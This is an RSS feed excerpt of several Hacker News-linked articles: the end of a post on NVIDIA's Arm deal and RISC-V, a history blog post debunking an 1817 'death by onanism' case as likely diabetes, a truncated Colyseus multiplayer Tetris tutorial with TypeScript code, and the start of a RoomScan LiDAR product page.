<div id="attachment_496"><p><img aria-describedby="caption-attachment-496" loading="lazy" src="https://jscitech.ir/wp-content/uploads/2020/10/NVIDIAs-Acquisition-of-Arm-What-are-the-Consequences2.jpg" alt="arm's grave stone" width="800" height="770"></p><p id="caption-attachment-496">An image demonstrating Arm’s death because of the deal. <em>Source: <a href="https://twitter.com/Underfox3">Underfox</a></em></p></div>
<p>This shift in the industry would probably alert Arm’s customers. As they wouldn’t want their leash in NVIDIA’s hands. Consequently, they would choose a plan B to employ it when things go sideways with Arm. Analysts believe that RISC-V could be a plan B for them. It is an instruction set architecture (ISA) but, however, unlike others this ISA is provided under open source licenses and therefore doesn’t require fees. Several companies provide RISC-V hardware, Linux has support for it and it is supported in popular software development tools.</p>
<p>Moreover according to <a href="https://www.eenewseurope.com/news/risc-v-boom-edge-ai-says-facebooks-chief-ai-scientist">Yann LeCun</a>, Facebook’s chief AI scientist and inventor of the Convolutional Neural Network (CNN), due to acquisition of Arm by NVIDIA, industry will move to RISC-V as it is a promising alternative to Arm’s solutions.</p>
<blockquote>
<p>“There is a change in the industry and ARM with NVIDIA makes people uneasy but the emergence of RISC-V sees chips with a RISC-V core and an NPU (neural processing unit). These are incredibly cheap, less than $10, with many out of China, and these will become ubiquitous. I’m wondering if RISC-V will take over the world there.”</p>
<p><a href="https://www.eenewseurope.com/news/risc-v-boom-edge-ai-says-facebooks-chief-ai-scientist">Yann LeCun, eeNews, 15 October 2020</a></p>
</blockquote>
<p>Here is also another analyst who believes RISC-V will be replacing Arm:</p>
<blockquote>
<p dir="ltr" lang="en">The complete destruction of ARM ecosystem and a mass exodus for RISC-V is absolutely predictable and will happen very quickly, in the next few years. My recommendation to everyone is to study the RISC-V Instruction Set Manual as soon as possible.</p>
<p>— Underfox (@Underfox3) <a href="https://twitter.com/Underfox3/status/1319676329919451138?ref_src=twsrc%5Etfw">October 23, 2020</a></p>
</blockquote>
<p>Codeplay Software Limited has <a href="https://semiaccurate.com/2020/10/29/codeplay-joins-the-risc-v-foundation/">recently announced</a> that they will be joining and bringing their tools to RISC-V foundation. Codeplay produces software tools and is a contributing member of the Multicore Association, the Khronos Group, and the HSA Foundation. Therefore, This move will be a huge leap forward for RISC-V and is a result of NVIDIA’s acquisition of Arm.</p>
</div></section>

<div data-autoplay="" data-interval="5" data-animation="fade" data-show_slide_delay="90" itemscope="itemscope" itemtype="https://schema.org/Blog"><div><div><article itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost"><a href="https://jscitech.ir/news-views/6502-microprocessor-but-7000-times-bigger/farhad/268/" data-rel="slide-1" title="The Good Old 6502 Microprocessor, But 7000x Bigger!"><img width="495" height="279" src="https://jscitech.ir/wp-content/uploads/2020/10/The-Good-Old-6502-Microprocessor-But-7000x-Bigger.jpg" alt="The Good Old 6502 Microprocessor, But 7000x Bigger!" loading="lazy"></a><div><header><h3 itemprop="headline"><a href="https://jscitech.ir/news-views/6502-microprocessor-but-7000-times-bigger/farhad/268/" title="The Good Old 6502 Microprocessor, But 7000x Bigger!">The Good Old 6502 Microprocessor, But 7000x Bigger!</a></h3><span><a href="https://jscitech.ir/category/natural-sciences/physical-sciences/engineering/electrical-engineering/" rel="tag">Electrical Engineering</a>, <a href="https://jscitech.ir/category/news-views/" rel="tag">News &amp; Views</a> </span><span></span></header><p>The MOS 6502 was revolutionary, it was used in several famous commercial products, for instance, Apple I or Atari 800. It has been fully reverse engineered at transistor level and you can simulate it on your computer right now! But one thing was missing, a life-sized 6502 microprocessor made up of discrete surface mount transistors, but that's not the case anymore!</p></div><span>
				<span itemprop="image" itemscope="itemscope" itemtype="https://schema.org/ImageObject">
						<span itemprop="url">https://jscitech.ir/wp-content/uploads/2020/10/The-Good-Old-6502-Microprocessor-But-7000x-Bigger.jpg</span>
						<span itemprop="height">469</span>
						<span itemprop="width">833</span>
				</span>
				<span itemprop="publisher" itemtype="https://schema.org/Organization" itemscope="itemscope">
						<span itemprop="name">Farhad Modaresi</span>
						<span itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject">
							<span itemprop="url">https://jscitech.ir/wp-content/uploads/2020/09/Untitled-3.png</span>
						 </span>
				</span><span itemprop="author" itemscope="itemscope" itemtype="https://schema.org/Person"><span itemprop="name">Farhad Modaresi</span></span><span itemprop="datePublished" datetime="2020-10-28T12:23:39+03:30">2020-10-15 17:33:28</span><span itemprop="dateModified" itemtype="https://schema.org/dateModified">2020-10-16 00:18:06</span><span itemprop="mainEntityOfPage" itemtype="https://schema.org/mainEntityOfPage"><span itemprop="name">The Good Old 6502 Microprocessor, But 7000x Bigger!</span></span></span></article><article itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost"><a href="https://jscitech.ir/news-views/cerebrospinal-fluid-leakage-after-a-covid-19-nasal-swab-test-a-case-report/farhad/239/" data-rel="slide-1" title="Cerebrospinal Fluid Leak After a COVID-19 Nasal Swab Test: A Case Report"><img width="495" height="279" src="https://jscitech.ir/wp-content/uploads/2020/10/ereberospinal-Fluid-Leakage-After-COVID-19-Nasal-Swab-Testing-A-Case-Report.jpg" alt="ereberospinal Fluid Leakage After COVID-19 Nasal Swab Testing: A Case Report" loading="lazy"><small>free</small></a><div><header><h3 itemprop="headline"><a href="https://jscitech.ir/news-views/cerebrospinal-fluid-leakage-after-a-covid-19-nasal-swab-test-a-case-report/farhad/239/" title="Cerebrospinal Fluid Leak After a COVID-19 Nasal Swab Test: A Case Report">Cerebrospinal Fluid Leak After a COVID-19 Nasal Swab Test: A Case Report</a></h3><span><a href="https://jscitech.ir/category/news-views/" rel="tag">News &amp; Views</a> </span><span></span></header><p>A woman in her 40s took a nasal COVID-19 test before her hernia surgery and shortly afterwards she developed rhinorrhea (runny nose) and headache; after visiting the hospital her runny nose turns out to be a cerebrospinal fluid (CSF) leakage from her brain.</p></div><span>
				<span itemprop="image" itemscope="itemscope" itemtype="https://schema.org/ImageObject">
						<span itemprop="url">https://jscitech.ir/wp-content/uploads/2020/10/ereberospinal-Fluid-Leakage-After-COVID-19-Nasal-Swab-Testing-A-Case-Report.jpg</span>
						<span itemprop="height">469</span>
						<span itemprop="width">833</span>
				</span>
				<span itemprop="publisher" itemtype="https://schema.org/Organization" itemscope="itemscope">
						<span itemprop="name">Farhad Modaresi</span>
						<span itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject">
							<span itemprop="url">https://jscitech.ir/wp-content/uploads/2020/09/Untitled-3.png</span>
						 </span>
				</span><span itemprop="author" itemscope="itemscope" itemtype="https://schema.org/Person"><span itemprop="name">Farhad Modaresi</span></span><span itemprop="datePublished" datetime="2020-10-28T12:23:39+03:30">2020-10-09 22:44:08</span><span itemprop="dateModified" itemtype="https://schema.org/dateModified">2020-10-09 23:12:07</span><span itemprop="mainEntityOfPage" itemtype="https://schema.org/mainEntityOfPage"><span itemprop="name">Cerebrospinal Fluid Leak After a COVID-19 Nasal Swab Test: A Case Report</span></span></span></article></div><div><article itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost"><a href="https://jscitech.ir/news-views/massive-research-funder-hhmi-forces-open-access-policies/farhad/205/" data-rel="slide-1" title="Massive Research Funder, HHMI, Forces Open Access Policies"><img width="495" height="279" src="https://jscitech.ir/wp-content/uploads/2020/10/Untitled.jpg" alt="Massive Research Funder, HHMI, Forces Open Access Policies" loading="lazy"><small>free</small></a><div><header><h3 itemprop="headline"><a href="https://jscitech.ir/news-views/massive-research-funder-hhmi-forces-open-access-policies/farhad/205/" title="Massive Research Funder, HHMI, Forces Open Access Policies">Massive Research Funder, HHMI, Forces Open Access Policies</a></h3><span><a href="https://jscitech.ir/category/news-views/" rel="tag">News &amp; Views</a> </span><span></span></header><p>The Howard Hughes Medical Institute (HHMI) today announced significant changes to its publishing policy; It is now requiring researchers it funds to make their research articles freely available at the time of publication.</p></div><span>
				<span itemprop="image" itemscope="itemscope" itemtype="https://schema.org/ImageObject">
						<span itemprop="url">https://jscitech.ir/wp-content/uploads/2020/10/Untitled.jpg</span>
						<span itemprop="height">469</span>
						<span itemprop="width">833</span>
				</span>
				<span itemprop="publisher" itemtype="https://schema.org/Organization" itemscope="itemscope">
						<span itemprop="name">Farhad Modaresi</span>
						<span itemprop="logo" itemscope="" itemtype="https://schema.org/ImageObject">
							<span itemprop="url">https://jscitech.ir/wp-content/uploads/2020/09/Untitled-3.png</span>
						 </span>
				</span><span itemprop="author" itemscope="itemscope" itemtype="https://schema.org/Person"><span itemprop="name">Farhad Modaresi</span></span><span itemprop="datePublished" datetime="2020-10-28T12:23:39+03:30">2020-10-04 20:40:57</span><span itemprop="dateModified" itemtype="https://schema.org/dateModified">2020-10-09 22:47:20</span><span itemprop="mainEntityOfPage" itemtype="https://schema.org/mainEntityOfPage"><span itemprop="name">Massive Research Funder, HHMI, Forces Open Access Policies</span></span></span></article></div></div></div>


<section itemscope="itemscope" itemtype="https://schema.org/BlogPosting" itemprop="blogPost"><p itemprop="text"><h3>Subscribe to get notified when we post an interesting article:</h3>
</p></section>


</div></div></main><!-- close content main element --> <!-- section close by builder template -->		</div><!--end builder template--></div></div>]]>
            </description>
            <link>https://jscitech.ir/news-views/nvidia-buy-arm-what-consequence/farhad/424/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25014986</guid>
            <pubDate>Sat, 07 Nov 2020 13:37:27 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Death by Onanism]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25014948">thread link</a>) | @mrtndavid
<br/>
November 7, 2020 | http://www.thomas-morris.uk/death-by-onanism/ | <a href="https://web.archive.org/web/*/http://www.thomas-morris.uk/death-by-onanism/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-4044">
	
	<!-- .entry-header -->


	<div>
				<p>Victorian society was famously paranoid about the dangers of masturbation. For teachers, priests and those with responsibility for young people, it was a question of morals and the corruption of youth – but the medical profession also agreed that self-abuse was a vice with terrible consequences. The old cliché that the practice ‘makes you go blind’ was not said just to frighten teenage boys – it was a view sincerely held by many physicians. Others suggested that masturbation caused <a href="http://www.thomas-morris.uk/an-unnatural-propensity-and-its-perils/">heart disease</a>, or proposed deeply unpleasant <a href="http://www.thomas-morris.uk/abominable-disgusting-habit/">treatment regimes</a> to make the problem go away.</p>
<p>Though many people will associate this fear with the nineteenth century, its roots go back a lot further – as least as early as the 1720s, when a pamphlet entitled <em>Onania; or, The heinous sin of self-pollution, and all its frightful consequences, in both sexes, considered</em> was published in London – and subsequently became a bestseller on <a href="https://quod.lib.umich.edu/e/evans/N02163.0001.001/1:6?rgn=div1;view=fulltext">both sides of the Atlantic</a>.</p>
<p>This article, published in the <em>Transactions of the Physico-medical Society of New York </em>in 1817, is another striking example. It is also an interesting example of faulty diagnosis. The author was a physician from Connecticut, Dr William Tully:<a href="http://www.thomas-morris.uk/wp-content/uploads/2020/11/Death-by-onanism.jpg"><img loading="lazy" src="http://www.thomas-morris.uk/wp-content/uploads/2020/11/Death-by-onanism.jpg" alt="An instance of death from onanism" width="461" height="230" srcset="http://www.thomas-morris.uk/wp-content/uploads/2020/11/Death-by-onanism.jpg 871w, http://www.thomas-morris.uk/wp-content/uploads/2020/11/Death-by-onanism-300x150.jpg 300w, http://www.thomas-morris.uk/wp-content/uploads/2020/11/Death-by-onanism-768x384.jpg 768w" sizes="(max-width: 461px) 100vw, 461px"></a></p>
<p><em>E.B., aged sixteen, of active habits, of bodily size rather less than medium, and as it respects strength of constitution less vigorous than most youths of his age, complained the 3rd of October, 1812, of indisposition.</em></p>
<p>‘Feeling ill’ is not a terribly useful description, but thankfully the doctor had a history to fall back on:</p>
<p><em>For some weeks previous to this, his friends had observed, that his countenance was becoming pale and unhealthy; that universal emaciation was stealing upon him, and that he constantly manifested unusual peevishness. His appetite during this period was not observably augmented or impaired, except for liquids. This thirst, for some time, had been uniform and considerable.</em></p>
<p>Although this set of symptoms is still quite vague, many doctors today would find one potential diagnosis immediately suggesting itself. Hint: it isn’t excessive masturbation.</p>
<p><em>As the changes, however, in the state of his health, had been from day to day hardly appreciable, and as he made no complaints of illness, little attention had been paid to these circumstances. About the 20th of September, an occasion resented, and he was observed to manifest an extraordinary relish and craving for new cider. </em></p>
<p>Today in America ‘apple cider’ (as opposed to ‘hard cider’) is a non-alcoholic beverage, but I believe that in 1812 Connecticut it would have been weakly alcoholic. Do correct me if I’m wrong.</p>
<p><em>From thenceforth, he sought every opportunity of indulging this appetite, almost without limit; and made use of stratagems to obtain the gratification of his desires, to which he had previously been a stranger. His desire for food, from this period, diminished; and though tolerably active in his customary employments, yet a rapid diminution of strength was observed.</em></p>
<p>There are good reasons for thinking this entire pattern of behaviour highly significant from a diagnostic point of view. More of that later.</p>
<p><em>About the 1st of October, an unusual secretion of urine, and an almost incessant disposition to empty the bladder, was perceived. On the 3rd, as mentioned above, he first complained of indisposition, and on the morning of the 4th, first had medical advice.</em></p>
<p>When Dr Tully visited the patient shortly afterwards, these were the symptoms he found:</p>
<p><em>Extreme emaciation, but not so much diminution of strength as to prevent walking about; complexion very pale; expression of the eyes, and whole countenance haggard and wild, though no mental derangement could be perceived; no appetite for food; great thirst; skin dry and cool; tongue dry, and covered with a reddish brown crust; pulse about 130 beats in a minute very small, and receding under slight pressure; indescribable, dull, distressing sensations about the precordia, and in the back; shortness of breath, frequent micturition, and copious discharges of urine, which was limpid and colourless. The preceding night had been passed in a very sleepless and restless manner.</em></p>
<p>And this is when Dr Tully made a discovery that, he believed, explained the whole case:</p>
<p><em>At this time, it was ascertained, that he had been in the habitual nocturnal practice of onanism for about six months, frequently repeating it five or six times in a night.</em></p>
<p>That is, admittedly, quite a lot.</p>
<p><em>On being questioned, whether he had not been sensible of the pernicious effect of this baneful practice, it was found, that for some time previous, he had experienced unpleasant and distressing sensations, as an immediate consequence of every orgasm; but so much was he under the dominion of this deadly habit, as to be unable to resist its influence, notwithstanding his conviction of its fatal consequences.</em></p>
<p>Dr Tully barely needed to hear any more.</p>
<p><em>In short, it was judged, that his whole malady was the ultimate result of this practice.</em></p>
<p><em>Its primary effects, seemed to have been derangement of the digestive organs; and the secondary ones, the symptoms above detailed.</em></p>
<p>The doctor prescribed baking soda and vinegar in the hope of ‘obtaining the exhilarating effects of disengaged carbonic acid in the stomach.’ Wine, opium and cinchona bark (containing quinine, good for fevers) were also administered, and the patient given nutritious broths. But their patient quickly deteriorated, and by 10 pm had become comatose. In the early hours of the following morning he died.</p>
<p>Dr Tully was in no doubt what had caused his patient’s death: masturbation.</p>
<p><em>The ill effects of the practice, which apparently gave rise to the preceding case, have been questioned by John Hunter, in his </em>Treatise on the Venereal<em>; but with due deference to his exalted reputation, I must say, that his argument of its universality, and the little apparent evidence against it, in my opinion, apply equally well to intemperance in the use of distilled spirits.</em></p>
<p>John Hunter was indeed sceptical of the idea that masturbation caused serious illness, writing that ‘the only true objection to this selfish enjoyment is the probability of its being repeated too frequently.’</p>
<p>While happy to admit that many of his contemporaries exaggerate the dangers, Dr Tully is adamant that the ‘sin of Onan’ has potentially fatal consequences.</p>
<p><em>That popular treatises upon it, tend rather to increase than diminish the evil, I readily admit; but as a physician, I am firmly convinced, that many a vigorous constitution, which though it does mot sink under it, yet receives such a shock by it, as is frequently followed by premature old age, and a host of infirmities.</em></p>
<p>Dr Tully ventures to suggest a refinement to the prevailing opinion on the mechanism of illness caused by masturbation:</p>
<p><em>It has been the commonly received opinion, that the part of the system first affected by Onanism, is the brain, and its production through the spina dorsi; but I have long been convinced, that the stomach is first peculiarly deranged, and these other parts in consequence. In this case, paleness, emaciation, and an unusual appetite for liquids, were the first observable symptoms. Speedily, however, further depravity of appetite, is manifest, and this of such a nature, as to be followed with a certain degree of diabetes. </em></p>
<p>And here Dr Tully stumbles agonisingly close to the likely truth of the case – though he mistakes cause for effect. Emaciation, insatiable thirst and an almost incessant need to urinate are classic symptoms of acute type 1 diabetes. So much so that a modern doctor reading the case report above would probably get no further than the first paragraph before thinking, ‘Could this be type 1 diabetes?’ It’s impossible to be certain, of course, but there is little in the rest of the case report that would cast doubt on this diagnosis.</p>
<p>One other aspect of the article struck me as interesting. In the later literature on the evils of masturbation, an archetype of the habitual masturbator emerged. This description of the ‘typical patient’ is taken from William Acton’s <em>The Functions and Disorders of the Reproductive Organs</em>, first published in 1857:</p>
<p><em>The frame is stunted and weak, the muscles undeveloped, the eye is sunken and heavy, the complexion is sallow, pasty, or covered with spots of acne, the hands are damp and cold, and the skin moist.</em></p>
<p>The echoes of Dr Tully’s 1817 case report are striking: the smaller-than-average frame, the general impression of feebleness and emaciation, the unhealthy complexion. This may not be an original observation, but I’ve not seen it made before, either: perhaps this entire archetype arose because doctors mistook diabetics for masturbators.</p>

	</div><!-- .entry-content -->
	
	<!-- .entry-footer -->

</article></div>]]>
            </description>
            <link>http://www.thomas-morris.uk/death-by-onanism/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25014948</guid>
            <pubDate>Sat, 07 Nov 2020 13:28:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Building a Multiplayer Game with Colyseus.io]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25014937">thread link</a>) | @s1hfmnn
<br/>
November 7, 2020 | https://blog.s1h.org/colyseus-multiplayer-game/ | <a href="https://web.archive.org/web/*/https://blog.s1h.org/colyseus-multiplayer-game/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
                                    <p>Computer games are awesome! Not only are they fun to play, but they’re also quite fun to build. Virtually every programmer, at one point or another, has at least thought about building a game.</p><p>That said, building games is not easy, and it takes a lot of imagination to create something truly impressive. If you want to build a multiplayer game, you must not only create a great game but also set up all the networking, which is a daunting task in itself.</p><p><a href="https://colyseus.io/">Colyseus</a> is designed to reduce the burden of networking so you can fully concentrate on your game mechanics. To demonstrate what it has to offer, we’ll implement a multiplayer Tetris clone — we’ll call it Tetrolyseus.</p><h2 id="getting-started-colyseus-backend-setup">Getting started - Colyseus Backend Setup</h2><p>Colyseus provides an <a href="https://docs.npmjs.com/cli/init">npm-init</a> initialiser which automates the creation of new projects.</p><pre><code>npm init colyseus-app ./my-colyseus-app
</code></pre><p>This interactive initialiser will take care of our basic setup. While it’s also possible to use Colyseus with plain old JavaScript or <a href="https://haxe.org/">Haxe</a>, we are going to stick with TypeScript.</p><pre><code>? Which language you'd like to use? …
❯ TypeScript (recommended)
  JavaScript
  Haxe
</code></pre><p>Once completed we will have the following files generated for us in <code>my-colyseus-app</code>:</p><pre><code>.
├── MyRoom.ts
├── README.md
├── index.ts
├── loadtest
├── node_modules
├── package-lock.json
├── package.json
└── tsconfig.json
</code></pre><p>We will dive right into Colyseus by taking a closer look at</p><ul><li><code>index.ts</code></li><li><code>MyRoom.ts</code></li></ul><h3 id="index-ts">index.ts</h3><p>The newly created <code>index.ts</code> file is our main entry point which sets up our server:</p><pre><code>const port = Number(process.env.PORT || 2567);
const app = express()


app.use(cors());
app.use(express.json())

const server = http.createServer(app);
const gameServer = new Server({
  server,
});
</code></pre><p>While not being necessarily required, the default <code>colyseus-app</code> templates also uses <a href="https://www.npmjs.com/package/express">express</a>, so we’re able to easily register additional route handlers on our backend. In case we do not want to provide additional handlers our setup boils down to:</p><pre><code>const port = Number(process.env.PORT || 2567);

const gameServer = new Server();
</code></pre><p>The second part of our <code>index.ts</code> file is where we actually expose our game logic:</p><pre><code>gameServer.define('my_room', MyRoom);

...
 
gameServer.listen(port);
console.log(`Listening on ws://localhost:${ port }`)
</code></pre><p>Colyseus uses the notion of <em>”rooms”</em> to implement game logic. Rooms are defined on our server with a unique name which our clients use to connect to it. A room handles client connections and also holds the game’s state. It is the central piece of our game, so we will see what they look like next.</p><h3 id="myroom-ts">MyRoom.ts</h3><pre><code>import { Room, Client } from "colyseus";

export class MyRoom extends Room {
  onCreate (options: any) {
    this.onMessage("type", (client, message) =&gt; {
      ...
    });
  }

  onJoin (client: Client, options: any) {
  }

  onLeave (client: Client, consented: boolean) {
  }

  onDispose() {
  }
}
</code></pre><p>As we can see, a few lifecycle events are attached to a Colyseus room.</p><ul><li><code>onCreate</code> is the first method to be called when a room is instantiated. We will be initialising our game state and wiring up our message listeners in <code>onCreate</code></li><li><code>onJoin</code> is called as soon a new client connects to our game room</li><li><code>onLeave</code> is the exact opposite to <code>onJoin</code>, so whenever a client leaves, disconnect and reconnection logic will be handled here</li><li><code>onDispose</code> is the last method to be called right before a game room will be disposed. Things like storing game results to a database and similar tasks might be carried out in <code>onDispose</code></li></ul><p>An additional event, although not included in the default room implementation, is <code>onAuth</code>. It allows us to implement custom authentication methods for joining clients as shown in the <a href="https://docs.colyseus.io/server/authentication/">authentication API docs.</a></p><p>Now that we’ve gained an overview of a basic Colyseus backend setup, let’s start modelling our game state.</p><p>You can find the code we wrote so far in the accompanying repository on <a href="https://github.com/s1h-org/tetrolyseus">GitHub</a>. The corresponding tag is <code>01-basic-setup</code>:</p><pre><code>git checkout tags/01-basic-setup -b 01-basic-setup
</code></pre><h2 id="managing-game-state">Managing Game State</h2><p>In one way or another, every game is holding state. Player position, current score, you name it. State makes the backbone of a game.</p><p>When talking about online multiplayer games, state becomes an even more complex topic. Not only do we have to model it properly, but now we also have to think about how we’re going to synchronise our state between all players.</p><p>And that’s where Colyseus really starts to shine. Its main goal is to take away the burden of networking and state synchronisation so we’re able to focus on what matters - our game logic!</p><h3 id="stateful-game-rooms">Stateful Game Rooms</h3><p>Previously we learned that a Colyseus room is able to store our game state. Whenever a new room is created, we initialise our state:</p><pre><code>import { Room, Client } from "colyseus";
import { MyGameState } from "./MyGameState";

export class MyRoom extends Room&lt;MyGameState&gt; {
  onCreate (options: any) {
    this.setState(new MyGameState());
    ...
  }
  
  ...
}
</code></pre><p>Every time a client connects to our room it will receive the full room state in an initial synchronisation, automatically.</p><p>Since room state is mutable, it has to be synced continuously. However, following the full state sync, Colyseus will only send incremental updates which are applied to the initial state. The interval for state syncs is configurable for each room via its <a href="https://docs.colyseus.io/server/room/#patchrate-number">patchRate</a> and defaults to 50 milliseconds (20 fps). Shorter intervals allow for fast-paced games!</p><p>So without further ado, let’s model our state!</p><h4 id="position">Position</h4><p>The two-dimensional Tetrolyseus board consists of several rows and columns. The <code>Position</code> state object is used to store the position of our active Tetrolyso block by its top-left row and column:</p><pre><code>import {Schema, type} from "@colyseus/schema";

export class Position extends Schema {
    @type("number")
    row: number;

    @type("number")
    col: number;

    constructor(row: number, col: number) {
        super();
        this.row = row;
        this.col = col;
    }
}
</code></pre><p>Our state class has to fulfil certain properties to be eligible for synchronisation:</p><ul><li>It has to extend the <a href="https://docs.colyseus.io/state/schema/">Schema base class</a></li><li>Data selected for synchronisation requires a <a href="https://docs.colyseus.io/state/schema/#primitive-types">type</a> annotation</li><li>A state instance has to be provided to the game room via <a href="https://docs.colyseus.io/state/schema/#primitive-types">setState</a></li></ul><p><code>Position</code> is a simple state class which synchronises two <code>number</code> properties: <code>row</code> and <code>col</code>. It nicely demonstrates how Colyseus Schema classes allow us to assemble our state from primitive types, automatically enabling synchronisation.</p><h4 id="board">Board</h4><p>Next up is our game board state. Similar to <code>Position</code> it stores two <code>number</code> properties, the <code>rows</code> and <code>cols</code> of our two-dimensional game board. Additionally, its <code>values</code> property holds an array of numbers, representing our board.</p><p>So far, we only worked with single data, so how are we going to model our state class holding a data collection? With Colyseus, collections should be stored in an <a href="https://docs.colyseus.io/state/schema/#arrayschema">ArraySchema</a>, Colyseus’ synchronizable <a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Array">Array</a>datatype for one-dimensional data.</p><pre><code>import {ArraySchema, Schema, type} from "@colyseus/schema";

export class Board extends Schema {
    @type(["number"])
    values: number[];

    @type("number")
    rows: number;

    @type("number")
    cols: number;

    constructor(rows: number = 20, cols: number = 10) {
        super();
        this.rows = rows;
        this.cols = cols;
        this.values = new ArraySchema&lt;number&gt;(...(new Array&lt;number&gt;(rows * cols).fill(0)));
    }
}
</code></pre><h4 id="tetrolyso">Tetrolyso</h4><p>A Tetrolyso block is basically just an extended version of a Board, having an additional <code>number</code> property storing it’s color. It is skipped here for brevity. Instead, please refer to the <a href="https://github.com/s1h-org/tetrolyseus/blob/master/state/Tetrolyso.ts">available implementation on GitHub</a>.</p><h4 id="gamestate">GameState</h4><p>What’s more interesting is our overall game state.</p><pre><code>import {Schema, type} from "@colyseus/schema";
import {getRandomBlock, Tetrolyso} from "./Tetrolyso";
import {Position} from "./Position";
import {Board} from "./Board";

export class GameState extends Schema {
    @type(Board)
    board: Board;

    @type(Tetrolyso)
    currentBlock: Tetrolyso;

    @type(Position)
    currentPosition: Position;

    @type(Tetrolyso)
    nextBlock: Tetrolyso;

    @type("number")
    clearedLines: number;

    @type("number")
    level: number;

    @type("number")
    totalPoints: number;

    constructor(rows: number = 20, cols: number = 10, initialLevel = 0) {
        super();
        this.board = new Board(rows, cols);
        this.currentBlock = getRandomBlock();
        this.currentPosition = new Position(0, 5);
        this.nextBlock = getRandomBlock();
        this.level = initialLevel;
        this.clearedLines = 0;
        this.totalPoints = 0;
    }
}
</code></pre><p>It consists of a few <code>number</code> properties but additionally, it possesses several <a href="https://docs.colyseus.io/state/schema/#child-schema-properties">child schema properties</a> to assemble the overall state.</p><p>Using such nested child state classes gives us great flexibility when modelling our state. <code>@type</code> annotations provide a simple and type-safe way to enable synchronisation and nested child schema allow us to break our state down which enables re-use.</p><p>Once again, if you want to along, the current tag is <code>02-gamestate</code> in our <a href="https://github.com/s1h-org/tetrolyseus">repository</a>.</p><pre><code>git checkout tags/02-gamestate -b 02-gamestate
</code></pre><h3 id="working-with-game-state-frontend">Working With Game State - Frontend</h3><p>Now that our first draft of our state is completed, let’s see how we can work with it. We will start with building a frontend for our game, since it allows us to visualise our game state.</p><p>Colyseus comes with a <a href="https://docs.colyseus.io/getting-started/javascript-client/">JavaScript client</a> which we’re going to use:</p><pre><code>npm i colyseus.js
</code></pre><p>We won’t be using any frontend framework, only plain HTML, CSS and TypeScript, so the only two additional things used to build our frontend will be:</p><ul><li><a href="https://nostalgic-css.github.io/NES.css/">nes.css</a></li><li><a href="https://parceljs.org/">parcel.js</a></li></ul><p>We will include nes.css via CDN, so we only need to add Parcel to our <code>devDependencies</code>:</p><pre><code>npm i -D parcel
</code></pre><p>Just enough to build the following layout:</p><pre><code>+----------------------------------------------------------+
|                                                          |
|  Title                                                   |
|                                                          |
+----------------------------------------------------------+
             +--------------------+ +------------+
             |                    | |            |
           …</code></pre></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.s1h.org/colyseus-multiplayer-game/">https://blog.s1h.org/colyseus-multiplayer-game/</a></em></p>]]>
            </description>
            <link>https://blog.s1h.org/colyseus-multiplayer-game/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25014937</guid>
            <pubDate>Sat, 07 Nov 2020 13:26:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Use iPhone Lidar to map your house]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25014935">thread link</a>) | @nikhizzle
<br/>
November 7, 2020 | https://www.locometric.com/lidar | <a href="https://web.archive.org/web/*/https://www.locometric.com/lidar">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="siteWrapper">
      
        
      

      


      <main id="page" role="main">
        
          <article data-page-sections="5f8eea022948ee0cc871bde2" id="sections">
  
    <section data-section-id="5f8ef04d2948ee0cc872e652" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
    &quot;imageOverlayOpacity&quot;: 0.15,
    &quot;video&quot;: {
      &quot;playbackSpeed&quot;: 0.5,
      &quot;filter&quot;: 1,
      &quot;filterStrength&quot;: 0,
      &quot;zoom&quot;: 0
    },
    &quot;backgroundWidth&quot;: &quot;background-width--full-bleed&quot;,
    &quot;sectionHeight&quot;: &quot;section-height--medium&quot;,
    &quot;horizontalAlignment&quot;: &quot;horizontal-alignment--center&quot;,
    &quot;verticalAlignment&quot;: &quot;vertical-alignment--middle&quot;,
    &quot;contentWidth&quot;: &quot;content-width--wide&quot;,
    &quot;customContentWidth&quot;: 100,
    &quot;sectionAnimation&quot;: &quot;none&quot;,
    &quot;backgroundMode&quot;: &quot;image&quot;
  }" data-animation="none">
  
  <div>
    <div>
      
      
      
      <div data-type="page-section" id="page-section-5f8ef04d2948ee0cc872e652"><div><div><div data-block-type="2" id="block-bec3116d6f0ef464cb8e"><div><h2>Easy, accurate &amp; fast.</h2><p>LiDAR is perfect for creating floor plans, so RoomScan LiDAR has a user experience created from scratch just for the iPhone 12 Pro and new iPad Pro. </p><p>Our unique ten years’ experience of using iPhone &amp; iPad sensors to automatically create floor plans with RoomScan Pro was all distilled into version 1.0 of RoomScan LiDAR. This combination of floor plan expertise with the precision and speed of Apple's ARKit and LiDAR results in an app which is gorgeously simple and effective.</p></div></div></div></div></div>
    </div>
  </div>
</section>

  
    <section data-section-id="5f8eea022948ee0cc871bded" data-controller="SectionWrapperController, MagicPaddingController" data-current-styles="{
    &quot;backgroundImage&quot;: {
      &quot;id&quot;: &quot;5f8f08d0d73bbf7c8177c4d9&quot;,
      &quot;recordType&quot;: 2,
      &quot;addedOn&quot;: 1603209424614,
      &quot;updatedOn&quot;: 1603231693103,
      &quot;workflowState&quot;: 1,
      &quot;publishOn&quot;: 1603209424614,
      &quot;authorId&quot;: &quot;5f8ec0c3d0e044016ba3f020&quot;,
      &quot;systemDataId&quot;: &quot;1603209432252-QIJC01U8MLQRF2HHFZF0&quot;,
